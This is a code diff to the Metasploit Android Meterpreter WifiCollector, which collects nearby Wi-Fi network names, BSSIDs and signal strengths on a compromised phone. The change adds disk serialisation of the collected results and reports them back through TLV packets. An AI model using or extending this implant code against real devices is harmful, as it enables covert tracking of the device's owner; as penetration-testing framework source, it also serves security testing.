@@ -12,9 +12,12 @@ import android.net.wifi.WifiManager;
 
 import com.metasploit.meterpreter.android.interval_collect;
 
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.IOException;
 
 import java.lang.InterruptedException;
+import java.lang.Math;
 
 import java.util.ArrayList;
 import java.util.Collections;
@@ -22,11 +25,52 @@ import java.util.List;
 import java.util.Hashtable;
 
 public class WifiCollector extends IntervalCollector {
-    private final Context context;
     private final Object syncObject = new Object();
 
-    private Hashtable<Long, List<ScanResult>> collections = null;
+    private Hashtable<Long, List<WifiResult>> collections = null;
     private WifiReceiver receiver = null;
+
+    private class WifiResult {
+        private final String bssid;
+        private final String ssid;
+        private final int level;
+
+        public WifiResult(String bssid, String ssid, int level) {
+            this.bssid = bssid;
+            this.ssid = ssid;
+            this.level = level;
+        }
+
+        public WifiResult(ScanResult result) {
+            this.bssid = result.BSSID;
+            this.ssid = result.SSID;
+            this.level = result.level;
+        }
+
+        public WifiResult(DataInputStream input) throws IOException {
+            this.bssid = input.readUTF();
+            this.ssid = input.readUTF();
+            this.level = input.readShort();
+        }
+
+        public void write(DataOutputStream output) throws IOException {
+            output.writeUTF(this.bssid);
+            output.writeUTF(this.ssid);
+            output.writeShort(this.level);
+        }
+
+        public String getBssid() {
+            return this.bssid;
+        }
+
+        public String getSsid() {
+            return this.ssid;
+        }
+
+        public int getLevel() {
+            return this.level;
+        }
+    }
 
     private class WifiReceiver extends BroadcastReceiver {
 
@@ -93,38 +137,78 @@ public class WifiCollector extends IntervalCollector {
         }
     }
 
-    public WifiCollector(long timeout, Context context) {
-        super(timeout);
-        this.context = context;
-        this.collections = new Hashtable<Long, List<ScanResult>>();
+    public WifiCollector(int collectorId, Context context, long timeout) {
+        super(collectorId, context, timeout);
+        this.collections = new Hashtable<Long, List<WifiResult>>();
     }
 
-    public void collect() {
-        List<ScanResult> results = this.receiver.runScan();
-        if (results != null) {
+    public WifiCollector(int collectorId, Context context) {
+        super(collectorId, context);
+        this.collections = new Hashtable<Long, List<WifiResult>>();
+    }
+
+    protected boolean collect(DataOutputStream output) throws IOException {
+        List<ScanResult> scanResults = this.receiver.runScan();
+        if (scanResults != null) {
+            List<WifiResult> results = new ArrayList<WifiResult>();
+            for (ScanResult scanResult : scanResults) {
+                results.add(new WifiResult(scanResult));
+            }
+
             synchronized (this.syncObject) {
                 this.collections.put(System.currentTimeMillis(), results);
+
+                // collect requires the result to be the serialised version of
+                // the collection data so that it can be written to disk
+                output.writeLong(this.timeout);
+                output.writeInt(this.collections.size());
+                for (Long ts : this.collections.keySet()) {
+                    results = this.collections.get(ts.longValue());
+                    output.writeLong(ts.longValue());
+                    output.writeInt(results.size());
+                    for (WifiResult wifiResult : results) {
+                        wifiResult.write(output);
+                    }
+                }
             }
+
+            return true;
+        }
+
+        return false;
+    }
+
+    protected void loadFromMemory(DataInputStream input) throws IOException {
+        this.timeout = input.readLong();
+        int collectionCount = input.readInt();
+        for (int i = 0; i < collectionCount; ++i) {
+            long ts = input.readLong();
+            int resultCount = input.readInt();
+            List<WifiResult> results = new ArrayList<WifiResult>();
+            for (int j = 0; j < resultCount; ++j) {
+                results.add(new WifiResult(input));
+            }
+            this.collections.put(ts, results);
         }
     }
 
-    public void init() {
+    protected void init() {
         if (this.receiver == null) {
             this.receiver = new WifiReceiver(this.context, this.getTimeout());
         }
     }
 
-    public void deinit() {
+    protected void deinit() {
         this.receiver = null;
     }
 
-    public boolean dump(TLVPacket packet) {
-        Hashtable<Long, List<ScanResult>> collections = this.collections;
+    public boolean flush(TLVPacket packet) {
+        Hashtable<Long, List<WifiResult>> collections = this.collections;
 
         synchronized (this.syncObject) {
             // create a new collection, for use on the other thread
             // if it's running
-            this.collections = new Hashtable<Long, List<ScanResult>>();
+            this.collections = new Hashtable<Long, List<WifiResult>>();
         }
 
         List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
@@ -132,7 +216,7 @@ public class WifiCollector extends IntervalCollector {
 
         for (Long ts : sortedKeys) {
             long timestamp = ts.longValue();
-            List<ScanResult> scanResults = collections.get(timestamp);
+            List<WifiResult> scanResults = collections.get(timestamp);
 
             TLVPacket resultSet = new TLVPacket();
 
@@ -144,13 +228,14 @@ public class WifiCollector extends IntervalCollector {
             }
 
             for (int i = 0; i < scanResults.size(); ++i) {
-                ScanResult result = scanResults.get(i);
+                WifiResult result = scanResults.get(i);
                 TLVPacket wifiSet = new TLVPacket();
 
                 try {
-                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_SSID, result.SSID);
-                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_BSSID, result.BSSID);
-                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL, result.level);
+                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_SSID, result.getSsid());
+                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_BSSID, result.getBssid());
+                    // level is negative, but it'll be converted to positive on the flip side.
+                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL, Math.abs(result.getLevel()));
 
                     resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI, wifiSet);
                 }
